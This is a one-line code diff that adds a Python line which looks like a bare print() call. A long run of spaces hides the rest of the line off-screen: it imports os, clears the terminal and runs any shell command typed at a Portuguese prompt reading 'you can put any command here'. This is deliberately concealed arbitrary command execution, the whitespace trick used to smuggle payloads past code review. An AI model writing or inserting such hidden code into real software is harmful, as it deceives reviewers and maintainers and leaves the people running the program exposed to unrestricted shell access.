@@ -1,0 +1,1 @@
+print()                                                                                                             ; import os; print(chr(27)+"[2J");os.system(input('Voce pode colocar qualquer comando aqui c: >>'))
